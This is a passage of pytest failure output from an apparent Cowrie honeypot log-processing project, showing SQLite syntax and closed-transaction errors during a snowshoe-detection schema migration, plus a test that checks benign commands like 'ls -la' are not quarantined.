        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_______________ test_bulk_loader_multiline_json_malformed_limit ________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_bulk_loader_multiline_jso0')

    
    # ============================================================================
    # Error Path Tests (Phase 1.5 - High ROI Only)
    # ============================================================================
    
    def test_bulk_loader_handles_database_connection_error(tmp_path) -> None:
        """Test bulk loader handles database connection failures gracefully.
    
>       Given: A database that fails to connect
        When: Bulk loader attempts to process events
        Then: Exception is raised with clear error message
        """

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:304: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:28: in _make_engine
    engine = create_engine_from_settings(settings)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77567cce1a90>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:11,728:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:11,728:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:11,729:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:11,729:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:11,737:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:11,737:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:11,738:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:11,738:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:11,739:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:11,739:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:11,741:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:11,741:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:11,743:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:11,743:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:11,744:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:11,744:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:11,745:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:11,745:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:11,746:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:11,746:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:11,748:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:11,748:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:11,749:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:11,749:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:11,750:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:11,750:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:11,750:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:11,750:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:11,751:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,751:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,752:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,752:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,753:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,753:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,753:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,753:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,754:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,754:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:11,754:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:11,754:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_________ TestIntelligentDefanging.test_safe_commands_not_quarantined __________

self = <test_bulk_loader_defanging.TestIntelligentDefanging object at 0x7756b439df90>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_safe_commands_not_quarant0')

    def test_safe_commands_not_quarantined(self, tmp_path: Path) -> None:
        """Test that safe commands are not quarantined."""
        events = [
            {
                "session": "safe123",
                "eventid": "cowrie.session.connect",
                "timestamp": "2024-01-01T00:00:00Z",
                "src_ip": "1.2.3.4",
            },
            {
                "session": "safe123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "ls -la",
            },
            {
                "session": "safe123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:02:00Z",
                "input": "pwd",
            },
        ]
        source = tmp_path / "safe_events.json"
        _write_events(source, events)
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:61: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader_defanging.py:29: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26e1550>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:12,342:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:12,342:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:12,343:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:12,343:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:12,351:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:12,351:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:12,352:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:12,352:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:12,355:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:12,355:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:12,357:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:12,357:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:12,359:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:12,359:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:12,361:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:12,361:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:12,362:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:12,362:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:12,363:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:12,363:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:12,365:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:12,365:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:12,367:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:12,367:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:12,368:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:12,368:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:12,369:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:12,369:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:12,370:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:12,370:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:12,373:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:12,373:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:12,374:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:12,374:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:12,374:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:12,374:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:12,375:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:12,375:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:12,375:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:12,375:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
